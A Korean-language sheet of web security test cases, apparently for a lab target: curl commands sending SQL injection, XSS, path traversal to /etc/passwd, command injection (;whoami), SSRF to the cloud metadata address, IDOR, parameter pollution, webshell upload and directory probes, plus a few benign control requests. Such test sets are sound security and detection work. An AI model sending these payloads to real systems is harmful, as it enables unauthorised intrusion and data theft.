# 웹 보안 테스트 케이스 정리

## 1. SQL Injection 테스트
가장 고전적인 인증 우회 패턴입니다.

```bash
curl "http://192.168.35.113/rest/products/search?q='union%20select%201,2,3,4,5,6,7,8,9--'"
```
---

## 2. XSS (Cross-Site Scripting) 테스트

스크립트 태그를 파라미터에 섞어 보내는 테스트입니다.

```bash
curl "http://192.168.35.113/#/search?q=<script>alert('xss')</script>"
```
---

## 3. Path Traversal 테스트

시스템 설정 파일 접근을 시도하는 테스트입니다.

```bash
curl "http://192.168.35.113/public/images/../../etc/passwd"
```
---

## 4. 대량 스캐닝 (Fuzzing) 테스트

존재하지 않는 페이지를 무작위로 호출하여 404 에러를 유발하거나, 응답 패턴을 수집하는 방식입니다.

```bash
for i in {1..20}; do
  curl "http://192.168.35.113/admin_$i"
done
```
---


## 5. Command Injection 테스트

애플리케이션이 시스템 명령어를 호출하는 기능이 있을 때, 세미콜론(`;`)이나 파이프(`|`) 등을 이용해 임의 명령어 실행 가능 여부를 확인하는 테스트입니다.

### 시스템 정보 탈취 시도

제품 ID 조회 뒤에 `id` 또는 `whoami` 명령어를 붙여 실행 여부를 확인합니다.

```bash
curl "http://192.168.35.113/rest/products/search?q=123;whoami"
curl "http://192.168.35.113/rest/products/search?q=123;id"
```
---

## 6. SSRF (Server-Side Request Forgery) 테스트
서버가 외부 리소스를 불러오는 기능을 악용하여, 서버 내부 네트워크(localhost 등)나 인가되지 않은 외부 주소로 요청을 보내게 만드는 테스트입니다.

### 내부 설정 정보 접근 시도
```bash
curl "http://192.168.35.113/rest/products/redirect?url=http://localhost:8080/admin/config"
curl "http://192.168.35.113/rest/products/redirect?url=http://169.254.169.254/latest/meta-data/"
```

---

## 7. Insecure Direct Object Reference (IDOR) 테스트
사용자가 자신의 권한을 벗어나 타인의 리소스 식별자(ID)를 직접 수정하여 데이터에 접근하는 테스트입니다.

### 타인 정보 조회 및 수정 시도
내 계정 ID가 100일 때, 101번 사용자의 프로필 정보를 요청합니다.

```bash
# 타인의 장바구니나 프로필 조회
curl -H "Authorization: Bearer [My_Token]" "http://192.168.35.113/rest/basket/101"
```

---

## 8. HTTP Parameter Pollution (HPP) 테스트
동일한 이름의 파라미터를 중복 전달했을 때, 서버가 이를 어떻게 처리하는지 확인하여 필터링 로직을 우회하는 테스트입니다.

### 필터 우회 시도
```bash
# 서버가 마지막 파라미터만 취급할 경우, 앞의 검증 로직을 우회할 가능성이 있음
curl "http://192.168.35.113/search?id=123&id=456' OR '1'='1"
```

---

## 9. File Upload Vulnerability 테스트
파일 업로드 기능이 있을 때, 실행 가능한 스크립트(php, jsp, asp 등)를 업로드하여 서버 권한을 획득(WebShell)하는 테스트입니다.

### 웹쉘 업로드 시도
이미지 파일인 것처럼 확장자를 속이거나(`shell.jpg.php`), Content-Type을 조작하여 전송합니다.

```bash
curl -X POST http://192.168.35.113/user/profile/image \
     -F "file=@webshell.php" \
     -H "Content-Type: multipart/form-data"
```

---

## 10. Security Misconfiguration (디렉토리 리스팅)
서버 설정 오류로 인해 특정 폴더 내의 파일 목록이 브라우저에 그대로 노출되는지 확인하는 테스트입니다.

```bash
# 관리자 페이지나 백업 폴더 접근 시도
curl -i "http://192.168.35.113/admin/"
curl -i "http://192.168.35.113/backup/"
curl -i "http://192.168.35.113/.git/"
```
---

## 11. 변형
### SQLi 변형
```bash
# 기본 OR 우회형
curl "http://192.168.35.113/rest/products/search?q=' OR '1'='1"

# 인코딩 주석 변형
curl "http://192.168.35.113/rest/products/search?q='union%20select%201,2,3--"

# 함수형 탐지
curl "http://192.168.35.113/rest/products/search?q=' AND SLEEP(3)--"
```
---

### XSS 변형
```bash
curl "http://192.168.35.113/rest/products/search?q=<img src=x onerror=alert(1)>"
curl "http://192.168.35.113/rest/products/search?q=<svg onload=alert(1)>"
curl "http://192.168.35.113/rest/products/search?q=javascript:alert(1)"
```
---

### Path Traversal 변형
```bash
curl --path-as-is "http://192.168.35.113/public/images/..%2f..%2fetc/passwd"
curl --path-as-is "http://192.168.35.113/public/images/%2e%2e/%2e%2e/etc/passwd"
curl --path-as-is "http://192.168.35.113/public/images/../../windows/win.ini"
```
---

### 정상 요청
```bash
curl "http://192.168.35.113/rest/products/search?q=apple"
curl "http://192.168.35.113/rest/products/search?q=juice"
curl "http://192.168.35.113/"
```